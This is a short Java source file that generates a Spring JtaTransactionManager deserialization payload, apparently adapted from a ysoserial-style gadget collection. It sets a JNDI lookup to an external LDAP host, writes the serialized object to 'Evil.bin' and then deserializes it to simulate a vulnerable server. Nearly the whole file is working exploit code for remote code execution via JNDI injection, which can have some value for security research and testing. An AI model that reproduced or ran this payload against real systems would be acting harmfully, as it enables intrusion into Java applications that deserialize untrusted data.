package com.Spring;

import org.springframework.transaction.jta.JtaTransactionManager;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;


/**
 * 	Requires:
 * 	    spring-tx : 5.2.3.RELEASE
 *      spring-context : 5.2.3.RELEASE
 *      javax.transaction-api : 1.2
 * 	    JDK: 1.8
 *
 * 	Refer:
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/Spring3.java
 */


public class Spring3 {
    public static void main(String[] args) throws Exception{
        String jndiURL = "ldap://e79ma.dns10g.com/obj";
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(manager);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }
}
